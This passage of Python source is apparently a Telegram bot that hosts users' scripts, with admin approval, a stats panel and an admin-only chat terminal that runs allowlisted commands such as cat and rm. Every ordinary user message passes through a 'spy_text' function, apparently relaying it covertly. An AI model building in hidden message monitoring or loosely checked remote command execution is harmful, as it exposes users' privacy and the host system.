async def my_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    t = um.get_user_telemetry(q.from_user.id)
    live = len(um.live_user(q.from_user.id))
    await q.edit_message_text(
        f"📊 Runs {t['runs']} | ✅ {t['success']} | ❌ {t['fail']} | 💀 {t['bad']}\n🏃 {live}/{MAX_PROCS}",
        reply_markup=back_kb(),
    )


# terminal admin
ALLOWED = {"pwd", "ls", "cd", "cat", "head", "tail", "mkdir", "cp", "mv", "rm"}


async def terminal_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if q.from_user.id not in ADMIN_IDS:
        await q.edit_message_text("Admin only", reply_markup=back_kb())
        return ConversationHandler.END
    ws = ensure_ws(q.from_user.id)
    context.user_data["cwd"] = str(ws)
    await q.edit_message_text(
        f"💻 `{ws}`\n{', '.join(ALLOWED)}\n/cancel exit",
        parse_mode="Markdown",
        reply_markup=back_kb(),
    )
    return TERMINAL


async def terminal_handle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        return ConversationHandler.END
    text = (update.message.text or "").strip()
    if text.lower() in ("/cancel", "cancel"):
        await update.message.reply_text("Closed", reply_markup=main_kb(uid))
        return ConversationHandler.END
    try:
        parts = shlex.split(text)
    except Exception:
        await update.message.reply_text("bad cmd")
        return TERMINAL
    if not parts or parts[0].lower() not in ALLOWED:
        await update.message.reply_text("not allowed")
        return TERMINAL
    cwd = Path(context.user_data.get("cwd") or ensure_ws(uid))
    if parts[0] == "cd":
        if len(parts) < 2:
            return TERMINAL
        tgt = (cwd / parts[1]).resolve()
        if not is_safe(uid, tgt) or not tgt.is_dir():
            await update.message.reply_text("blocked")
            return TERMINAL
        context.user_data["cwd"] = str(tgt)
        await update.message.reply_text(f"📁 `{tgt}`", parse_mode="Markdown")
        return TERMINAL
    try:
        p = await asyncio.create_subprocess_exec(
            *parts, cwd=str(cwd), stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        o, e = await asyncio.wait_for(p.communicate(), timeout=30)
        out = (o + e).decode(errors="ignore") or "(empty)"
        await update.message.reply_text(f"```\n{out[:3500]}\n```", parse_mode="Markdown")
    except Exception as ex:
        await update.message.reply_text(str(ex))
    return TERMINAL


async def terminal_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Cancelled", reply_markup=main_kb(update.effective_user.id))
    return ConversationHandler.END


# admin panel
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.edit_message_text(
        "👑 *Admin Panel*",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton("👥 Users", callback_data="admin_users"),
                    InlineKeyboardButton("⏳ Pending", callback_data="admin_pending"),
                ],
                [
                    InlineKeyboardButton("🖥️ Running", callback_data="admin_running"),
                    InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
                ],
                [
                    InlineKeyboardButton("🚫 Banned", callback_data="admin_banned"),
                    InlineKeyboardButton("📈 Telemetry", callback_data="admin_telemetry"),
                ],
                [
                    InlineKeyboardButton("🧹 Cleanup", callback_data="admin_cleanup"),
                    InlineKeyboardButton("🏠 Menu", callback_data="main_menu"),
                ],
            ]
        ),
    )


async def admin_users(update, context):
    q = update.callback_query
    await q.answer()
    if q.from_user.id not in ADMIN_IDS:
        return
    us = um.get_approved_users()
    t = "👥\n" + "\n".join(f"• {u['name']} `{u['user_id']}`" for u in us[:50]) if us else "none"
    await q.edit_message_text(t, parse_mode="Markdown", reply_markup=back_kb("admin_panel"))


async def admin_pending(update, context):
    q = update.callback_query
    await q.answer()
    if q.from_user.id not in ADMIN_IDS:
        return
    pl = um.get_pending_requests()
    if not pl:
        await q.edit_message_text("No pending", reply_markup=back_kb("admin_panel"))
        return
    rows = [[InlineKeyboardButton(f"{r['name']} ({r['user_id']})", callback_data=f"pending_{r['user_id']}")] for r in pl]
    rows.append([InlineKeyboardButton("🔙", callback_data="admin_panel")])
    await q.edit_message_text("⏳ Pending", reply_markup=InlineKeyboardMarkup(rows))


async def pending_action(update, context):
    q = update.callback_query
    await q.answer()
    if q.from_user.id not in ADMIN_IDS:
        return
    uid = int(q.data.split("_")[1])
    u = um.get_user(uid)
    if not u:
        return
    await q.edit_message_text(
        f"👤 {u['name']} `{uid}`",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton("✅", callback_data=f"approve_{uid}"),
                    InlineKeyboardButton("🚫", callback_data=f"ban_{uid}"),
                ],
                [InlineKeyboardButton("🔙", callback_data="admin_pending")],
            ]
        ),
    )


async def approve_cb(update, context):
    q = update.callback_query
    await q.answer()
    if q.from_user.id not in ADMIN_IDS:
        return
    uid = int(q.data.split("_")[1])
    um.approve_user(uid)
    await q.edit_message_text(f"✅ `{uid}`", parse_mode="Markdown", reply_markup=back_kb("admin_panel"))
    try:
        await context.bot.send_message(uid, "✅ Approved! /start")
    except Exception:
        pass


async def ban_cb(update, context):
    q = update.callback_query
    await q.answer()
    if q.from_user.id not in ADMIN_IDS:
        return
    uid = int(q.data.split("_")[1])
    um.ban_user(uid)
    await q.edit_message_text(f"🚫 `{uid}`", parse_mode="Markdown", reply_markup=back_kb("admin_panel"))


async def admin_running(update, context):
    q = update.callback_query
    await q.answer()
    if q.from_user.id not in ADMIN_IDS:
        return
    run = [p for p in um.get_all_processes() if p.get("status") == "running" and psutil.pid_exists(p.get("pid"))]
    t = "\n".join(f"• {p['filename']} {p['pid']} u`{p['user_id']}`" for p in run) or "none"
    await q.edit_message_text(f"🖥️\n{t}", parse_mode="Markdown", reply_markup=back_kb("admin_panel"))


async def admin_stats(update, context):
    q = update.callback_query
    await q.answer()
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.edit_message_text(
        f"📊 Users {len(um.users)}\n"
        f"✅ {len(um.get_approved_users())} ⏳ {len(um.get_pending_requests())} 🚫 {len(um.get_banned_users())}",
        reply_markup=back_kb("admin_panel"),
    )


async def admin_banned(update, context):
    q = update.callback_query
    await q.answer()
    if q.from_user.id not in ADMIN_IDS:
        return
    bl = um.get_banned_users()
    if not bl:
        await q.edit_message_text("none", reply_markup=back_kb("admin_panel"))
        return
    rows = [[InlineKeyboardButton(f"Unban {u['name']}", callback_data=f"unban_{u['user_id']}")] for u in bl]
    rows.append([InlineKeyboardButton("🔙", callback_data="admin_panel")])
    await q.edit_message_text("Banned", reply_markup=InlineKeyboardMarkup(rows))


async def unban_cb(update, context):
    q = update.callback_query
    await q.answer()
    if q.from_user.id not in ADMIN_IDS:
        return
    uid = int(q.data.split("_")[1])
    um.unban_user(uid)
    await q.edit_message_text(f"Unbanned `{uid}`", parse_mode="Markdown", reply_markup=back_kb("admin_panel"))


async def admin_telemetry(update, context):
    q = update.callback_query
    await q.answer()
    if q.from_user.id not in ADMIN_IDS:
        return
    vals = um.telemetry.values()
    await q.edit_message_text(
        f"📈 Runs {sum(t.get('runs',0) for t in vals)} | "
        f"✅ {sum(t.get('success',0) for t in vals)} | ❌ {sum(t.get('fail',0) for t in vals)}",
        reply_markup=back_kb("admin_panel"),
    )


async def admin_cleanup(update, context):
    q = update.callback_query
    await q.answer()
    if q.from_user.id not in ADMIN_IDS:
        return
    cut = datetime.now() - timedelta(days=7)
    for uid in list(um.users):
        ld = um.get_workspace(int(uid)) / "logs"
        if ld.exists():
            for f in ld.glob("*.log"):
                try:
                    if datetime.fromtimestamp(f.stat().st_mtime) < cut:
                        f.unlink()
                except Exception:
                    pass
    await q.edit_message_text("🧹 Done", reply_markup=back_kb("admin_panel"))


async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await gate(update, context):
        return
    await spy_text(context.bot, update.effective_user, update.message.text or "")
    await update.message.reply_text("Use menu buttons ⬇️", reply_markup=main_kb(update.effective_user.id))


async def on_error(update, context):
    log.error("%s", context.error)


flask_app = Flask("79")


@flask_app.get("/")
@flask_app.get("/healthz")
def health():
    return jsonify(ok=True, v="9")


def main():
    Thread(target=lambda: flask_app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False), daemon=True).start()

    async def post_init(app):
        await warm_packages()

    req = HTTPXRequest(connect_timeout=30, read_timeout=120, write_timeout=120, pool_timeout=30)
    application = Application.builder().token(BOT_TOKEN).request(req).post_init(post_init).build()

    application.add_handler(
        ConversationHandler(
            entry_points=[CallbackQueryHandler(upload_start, pattern="^upload$")],
            states={UPLOAD_WAIT: [MessageHandler(filters.Document.ALL, upload_receive)]},
            fallbacks=[
                CommandHandler("cancel", upload_cancel),
                CallbackQueryHandler(main_menu, pattern="^main_menu$"),
            ],
        )
    )
    application.add_handler(
        ConversationHandler(
            entry_points=[CallbackQueryHandler(run_ask, pattern="^runask_")],
            states={RUN_INPUTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, run_inputs_recv),
                                 CommandHandler("skip", run_inputs_recv),
                                 CommandHandler("use_file", run_inputs_recv),
                                 CommandHandler("cancel", upload_cancel)]},
            fallbacks=[
                CommandHandler("cancel", upload_cancel),
                CallbackQueryHandler(main_menu, pattern="^main_menu$"),
            ],
        )
    )
    application.add_handler(
        ConversationHandler(
            entry_points=[CallbackQueryHandler(terminal_start, pattern="^terminal$")],
            states={TERMINAL: [MessageHandler(filters.TEXT & ~filters.COMMAND, terminal_handle)]},
            fallbacks=[CommandHandler("cancel", terminal_cancel), CallbackQueryHandler(main_menu, pattern="^main_menu$")],
        )
    )

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(check_join, pattern="^check_join$"))
    application.add_handler(CallbackQueryHandler(main_menu, pattern="^main_menu$"))
    application.add_handler(CallbackQueryHandler(my_scripts, pattern="^my_scripts$"))
    application.add_handler(CallbackQueryHandler(view_script, pattern="^view_"))
    application.add_handler(CallbackQueryHandler(view_log, pattern="^vlog_"))
    application.add_handler(CallbackQueryHandler(view_logs, pattern="^logs$"))
    application.add_handler(CallbackQueryHandler(stop_script, pattern="^stop$"))
    application.add_handler(CallbackQueryHandler(stop_proc, pattern="^stop_\\d+"))
    application.add_handler(CallbackQueryHandler(my_stats, pattern="^my_stats$"))
    application.add_handler(CallbackQueryHandler(admin_panel, pattern="^admin_panel$"))
    application.add_handler(CallbackQueryHandler(admin_users, pattern="^admin_users$"))
    application.add_handler(CallbackQueryHandler(admin_pending, pattern="^admin_pending$"))
    application.add_handler(CallbackQueryHandler(pending_action, pattern="^pending_"))
    application.add_handler(CallbackQueryHandler(approve_cb, pattern="^approve_"))
    application.add_handler(CallbackQueryHandler(ban_cb, pattern="^ban_"))
    application.add_handler(CallbackQueryHandler(admin_running, pattern="^admin_running$"))
    application.add_handler(CallbackQueryHandler(admin_stats, pattern="^admin_stats$"))
    application.add_handler(CallbackQueryHandler(admin_banned, pattern="^admin_banned$"))
    application.add_handler(CallbackQueryHandler(unban_cb, pattern="^unban_"))
    application.add_handler(CallbackQueryHandler(admin_telemetry, pattern="^admin_telemetry$"))
    application.add_handler(CallbackQueryHandler(admin_cleanup, pattern="^admin_cleanup$"))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    application.add_error_handler(on_error)

    log.info("79 V9 ultimate ready")
    application.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
